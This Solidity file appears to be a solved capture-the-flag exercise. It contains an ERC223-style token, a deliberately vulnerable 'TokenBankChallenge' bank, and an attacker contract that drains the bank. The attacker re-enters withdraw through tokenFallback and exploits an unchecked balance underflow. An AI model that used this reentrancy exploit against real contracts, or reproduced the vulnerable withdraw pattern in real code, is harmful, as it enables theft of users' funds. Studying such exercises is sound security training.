// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

interface IToken {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value, bytes memory data) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool success);
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge is ITokenReceiver {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    address public player;

    constructor(address _player) {
        token = new SimpleERC223Token();
        player = _player;
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);
        require(token.transfer(msg.sender, amount));

        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
}

// Write your exploit contract below
contract TokenBankAttacker {
    TokenBankChallenge public challenge;

    uint256 public constant TOKEN_AMOUNT = 200;

    constructor(address challengeAddress) {
        challenge = TokenBankChallenge(challengeAddress);
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        address tokenAddress = address(challenge.token());
        uint256 balance = IToken(tokenAddress).balanceOf(address(this));
        uint256 balanceBank = challenge.balanceOf(address(this));

        if (balance == TOKEN_AMOUNT && balanceBank == TOKEN_AMOUNT / 2) {
            challenge.withdraw(99);
        }
    }

    function withdraw(uint256 amount) public {
        address tokenAddress = address(challenge.token());
        IToken(tokenAddress).transfer(address(challenge), amount);
        challenge.withdraw(TOKEN_AMOUNT / 2);

        uint256 bankBalance = IToken(tokenAddress).balanceOf(address(challenge));
        challenge.withdraw(bankBalance);
    }

    receive() external payable {}
}
